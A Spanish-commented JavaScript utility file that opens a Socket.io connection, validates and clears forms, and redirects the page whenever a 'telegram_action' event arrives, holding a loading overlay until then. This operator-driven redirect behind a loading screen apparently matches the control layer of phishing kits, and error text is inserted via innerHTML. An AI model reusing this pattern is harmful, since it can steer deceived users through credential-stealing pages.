/**
 * COMMON UTILITIES
 * Funciones compartidas entre todas las páginas
 * Versión mejorada con mejor arquitectura y manejo de errores
 */

window.commonUtils = {
    // Estado de inicialización
    initialized: false,
    
    /**
     * Inicializa todas las funciones comunes
     */
    initializeCommon: function() {
        if (this.initialized) {
            console.log('⚠️ Common utils ya inicializados');
            return;
        }

        console.log('🔧 Inicializando common utilities...');
        
        // Crear elementos UI necesarios
        this.createErrorMessage();
        
        // Inicializar Socket.io si no está ya inicializado
        if (!window.socket && typeof io !== 'undefined') {
            this.initializeSocket();
        }
        
        // Inicializar loading overlay si está disponible
        if (window.loadingOverlay && !window.loadingOverlay.isInitialized) {
            window.loadingOverlay.init();
        }
        
        this.initialized = true;
        console.log('✅ Common utilities inicializados correctamente');
    },

    /**
     * Inicializa la conexión Socket.io con el servidor
     */
    initializeSocket: function() {
        console.log('🔌 Inicializando Socket.io...');
        
        try {
            if (window.socket && window.socket.connected) {
                console.log('✅ Socket.io ya está conectado');
                return;
            }

            if (typeof io === 'undefined') {
                console.error('❌ Socket.io library no está cargada');
                return;
            }

            const socketOptions = {
                path: '/socket.io',
                transports: ['websocket', 'polling'],
                reconnection: true,
                reconnectionAttempts: 10,
                reconnectionDelay: 1000,
                reconnectionDelayMax: 5000,
                timeout: 20000,
                autoConnect: true,
                forceNew: false
            };

            // Conectar al servidor actual
            const socketUrl = window.location.origin;
            console.log('🔗 Conectando a:', socketUrl);
            
            window.socket = io(socketUrl, socketOptions);
            
            // ===== EVENTOS DE CONEXIÓN =====
            
            window.socket.on('connect', () => {
                console.log('✅ Socket.io conectado - ID:', window.socket.id);
                this.hideLoading();
            });

            window.socket.on('connected', (data) => {
                console.log('📡 Confirmación del servidor:', data);
            });

            window.socket.on('telegram_action', (data) => {
                console.log('📲 [TELEGRAM_ACTION] Datos recibidos:', JSON.stringify(data, null, 2));
                this.handleTelegramAction(data);
            });

            window.socket.on('disconnect', (reason) => {
                console.log('🔌 Socket.io desconectado:', reason);
                if (reason === 'io server disconnect') {
                    // Reconectar manualmente si el servidor desconectó
                    window.socket.connect();
                }
                this.showLoading('Reconectando al servidor...');
            });

            window.socket.on('connect_error', (error) => {
                console.error('❌ Error de conexión:', error.message);
                this.showLoading('Problema de conexión, reintentando...');
            });

            window.socket.on('reconnect', (attemptNumber) => {
                console.log('✅ Reconectado después de', attemptNumber, 'intentos');
                this.hideLoading();
            });

            window.socket.on('reconnect_attempt', (attemptNumber) => {
                console.log('🔄 Intento de reconexión:', attemptNumber);
            });

            window.socket.on('reconnect_error', (error) => {
                console.error('❌ Error de reconexión:', error.message);
            });

            window.socket.on('reconnect_failed', () => {
                console.error('❌ Reconexión fallida después de múltiples intentos');
                this.hideLoading();
                this.showError('Error de conexión. Por favor, recarga la página.');
            });

            window.socket.on('error', (error) => {
                console.error('❌ Error en socket:', error);
            });

        } catch (error) {
            console.error('❌ Error al inicializar Socket.io:', error);
            this.hideLoading();
        }
    },

    /**
     * Maneja las acciones recibidas desde Telegram
     * @param {Object} data - Datos de la acción
     */
    handleTelegramAction: function(data) {
        console.log('⚙️ Procesando acción de Telegram:', data);
        
        const { action, message, redirect } = data;
        
        // Guardar mensaje si existe
        if (message) {
            sessionStorage.setItem('actionMessage', message);
            console.log('💬 Mensaje guardado:', message);
        }
        
        // Si hay redirección, mantener overlay
        if (redirect) {
            console.log('↗️ Preparando redirección a:', redirect);
            
            // Mantener o mostrar overlay
            if (window.loadingOverlay) {
                if (!window.loadingOverlay.isVisible()) {
                    window.loadingOverlay.show();
                }
            }
            
            // Ejecutar redirección
            setTimeout(() => {
                console.log('🔄 Ejecutando redirección...');
                window.location.href = redirect;
            }, 800);
            return;
        }
        
        // Si no hay redirección, mantener overlay visible con 'Cargando'
        if (!redirect) {
            console.log('⏳ Manteniendo overlay visible: Cargando...');
            // El overlay permanece visible hasta que haya redirección
        }
    },

    /**
     * Crea el mensaje de error en el DOM
     */
    createErrorMessage: function() {
        if (document.querySelector('.error-toast')) return;
        
        const errorToast = document.createElement('div');
        errorToast.className = 'error-toast';
        errorToast.style.cssText = `
            display: none;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #fff2f2;
            border: 1px solid #ffcdd2;
            border-left: 4px solid #d32f2f;
            color: #d32f2f;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 10000;
            max-width: 90%;
            width: 400px;
            text-align: left;
            animation: slideDown 0.3s ease-out;
        `;
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideDown {
                from {
                    opacity: 0;
                    transform: translateX(-50%) translateY(-20px);
                }
                to {
                    opacity: 1;
                    transform: translateX(-50%) translateY(0);
                }
            }
        `;
        
        document.head.appendChild(style);
        document.body.appendChild(errorToast);
    },

    /**
     * Muestra la pantalla de carga
     * @param {string} message - Mensaje a mostrar
     */
    showLoading: function(message = 'Procesando información...') {
        if (window.loadingOverlay) {
            window.loadingOverlay.showLoading(message);
        } else {
            console.warn('⚠️ LoadingOverlay no está disponible');
        }
    },

    /**
     * Oculta la pantalla de carga
     */
    hideLoading: function() {
        if (window.loadingOverlay) {
            window.loadingOverlay.hide();
        }
    },

    /**
     * Muestra un mensaje de error
     * @param {string} message - Mensaje de error
     * @param {number} duration - Duración en ms
     */
    showError: function(message, duration = 5000) {
        const errorToast = document.querySelector('.error-toast');
        
        if (errorToast) {
            errorToast.innerHTML = `
                <strong>⚠️ Error</strong><br>
                ${message}
            `;
            errorToast.style.display = 'block';
            
            setTimeout(() => {
                errorToast.style.display = 'none';
            }, duration);
        } else {
            // Fallback a alert si no existe el toast
            alert('Error: ' + message);
        }
    },

    /**
     * Muestra un mensaje de éxito
     * @param {string} message - Mensaje de éxito
     * @param {number} duration - Duración en ms
     */
    showSuccess: function(message, duration = 3000) {
        if (window.loadingOverlay) {
            window.loadingOverlay.showSuccess(message, duration);
        }
    },

    /**
     * Valida un formulario antes de enviar
     * @param {HTMLFormElement} form - Formulario a validar
     * @returns {boolean}
     */
    validateForm: function(form) {
        const inputs = form.querySelectorAll('input[required], select[required]');
        let isValid = true;

        inputs.forEach(input => {
            if (!input.value.trim()) {
                isValid = false;
                input.classList.add('error');
            } else {
                input.classList.remove('error');
            }
        });

        if (!isValid) {
            this.showError('Por favor complete todos los campos requeridos');
        }

        return isValid;
    },

    /**
     * Limpia un formulario
     * @param {HTMLFormElement} form - Formulario a limpiar
     */
    clearForm: function(form) {
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            if (input.type !== 'submit' && input.type !== 'button') {
                input.value = '';
                input.classList.remove('error');
            }
        });
    }
};

// ===============================
// VARIABLES GLOBALES
// ===============================

window.isSubmitting = false;

// ===============================
// AUTO-INICIALIZACIÓN
// ===============================

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.commonUtils.initializeCommon();
    });
} else {
    window.commonUtils.initializeCommon();
}